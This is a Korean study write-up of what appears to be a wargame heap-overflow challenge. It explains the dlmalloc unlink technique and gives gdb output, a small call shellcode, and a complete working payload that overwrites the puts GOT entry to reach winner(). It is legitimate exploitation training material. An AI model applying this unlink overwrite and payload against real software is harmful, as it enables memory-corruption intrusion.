*핵심 요약 정리
[0xfffffffc][0xfffffffc][fd][bk]

fd+12의 주소에 bk의 주소가 들어가고
bk+8의 주소에 fd의 주소가 들어간다.

공격 코드 예시 [0xfffffffc][0xfffffffc][GOT주소-12][목적지의 주소]



공격이 가능한 경우 : malloc이 연속되어 있고 입력값의 길이 검사를 하지 않아 heapoverflow가 가능한경우를 전제로 한다.
1. free하는 chunk의 앞 chunk가 사용중이 아닌경우(Free할 chunk의 PREV_USE가 0일 경우) 앞 chunk에서 unlink수행
2. free하는 chunk의 뒷 chunk가 사용중이 아니고(뒷뒷chunk의 PREV_USE의 0일경우,free하는 chunk의 크기가 100이 넘을경우) 뒷 chunk에서 unlink수행

목적지의 주소는 어디가 좋을까? -> 목적지의 주소의 +8 위치도 변경되므로 8바이트보다 작은 어셈블리 코드의 주소를 넣은 곳으로 하자. 그럼 got에는 목적지의 주소로 변경되고 목적지의 주소에 있는 어셈블리 코드가 실행된다. 

0xfffffffc는 무엇인가요? -> 2번 공격에서 free하는 chunk의 뒷 chunk에 대한 prev_use와 prev_size를 의미하는 공간에 들어간다. 0xfffffffc는 prev_size의 값을 음수(-4)로 만들고 prev_use바이트도 0(미사용중)으로 두가지 조건을 동시에 만족하는 값.

-----------------------------------문제 풀기-----------------------------------------

이 문제의 예제코드
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}


x/3i 0x8048790
   0x8048790 <puts@plt>:	jmp    DWORD PTR ds:0x804b128
   0x8048796 <puts@plt+6>:	push   0x68
   0x804879b <puts@plt+11>:	jmp    0x80486b0

x/3i 0x804b128
   0x804b128 <puts@got.plt>:	xchg   esi,eax
   0x804b129 <puts@got.plt+1>:	xchg   DWORD PTR [eax+ecx*1],eax
   0x804b12c <munmap@got.plt>:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]

위 두번을 통해 got의 주소는 0x804b128임을 알게됨

print winner
$1 = {void (void)} 0x8048864 <winner>

목적지의 주소는 0x8048864임 여기로 점프를 시켜야 함. got를 winner로 직접 바꾸면 winner+8의 값이 got로 변경되므로
got의 주소 -> winner로 jmp하는 쉘코드가 있는 8바이트 이내의 어셈블리 코드가 있는 주소 -> winner로 도착! 이 목적

0x804c004:	0x00000029	0x41414141	0x00000000	0x00000000
0x804c014:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c024:	0x00000000	0x00000000	0x00000029	0x42424242
0x804c034:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c044:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c054:	0x00000029	0x43434343	0x00000000	0x00000000
0x804c064:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c074:	0x00000000	0x00000000	0x00000f89	0x00000000

C의 chunk크기가 100 -> 0x804c054 를 65로 변경 그다음A를 92개 넣기
0x804b128 - 12 = 0x804b11c -> got-12
목적지 쉘코드는 0x804c008에 넣으면 A가 free된 이후에 쉘코드가 덮어 씌워지므로 넉넉히 A의 시작주소 +8바이트로 해주기 즉 0x804c010에 넣자.
공격 코드 [0xfffffffc][0xfffffffc][0x804b11c][0x804c010]


String Literal:

"\xB8\x64\x88\x04\x08\xFF\xD0"

Array Literal:

{ 0xB8, 0x64, 0x88, 0x04, 0x08, 0xFF, 0xD0 }
Disassembly:

0:  b8 64 88 04 08          mov    eax,0x8048864
5:  ff d0                   call   eax


jmp하는 어셈블리코드는 어떻게 바이너리로 만드나요? https://defuse.ca/online-x86-assembler.htm#disassembly 이곳에서 어셈코드 넣으면 바이너리로 만들어줍니당.

r $(python -c 'print "AAAA"*2+ "\xB8\x64\x88\x04\x08\xFF\xD0"') $(python -c "print 'AAAA'*9+'\x65'") $(python -c 'print "A"*92 +"\xfc\xff\xff\xff"*2+"\x1c\xb1\x04\x08"+"\x10\xc0\x04\x08"')  --> 성공!



0x804c004:	0x000000b1	0x0804b23c	0x0804b23c	0x048864b8
0x804c014:	0x00d0ff08	0x0804b11c	0x00000000	0x00000000
0x804c024:	0x00000000	0x00000028	0x00000028	0x00000000
0x804c034:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c044:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c054:	0x00000060	0x0804b194	0x0804b194	0x41414141
0x804c064:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c074:	0x41414141	0x41414141	0x00000409	0x74616874
0x804c084:	0x73617720	0x2074276e	0x206f6f74	0x20646162
0x804c094:	0x2c776f6e	0x73617720	0x3f746920	0x31204020
0x804c0a4:	0x31383435	0x39303439	0x41410a39	0x000000b0
0x804c0b4:	0xfffffffc	0xfffffffc	0x0804b11c	0x0804c010

0x804c008~0x804c00c보면 a가 free되면서 fd와 bk값이 채워진걸 볼 수 있음 따라서 winner()로 jmp 하는 어셈블리 코드를 넣을 곳의 주소를 데이터를 넣는 지점에서 8바이트를 추가했던건 옳은 판단!


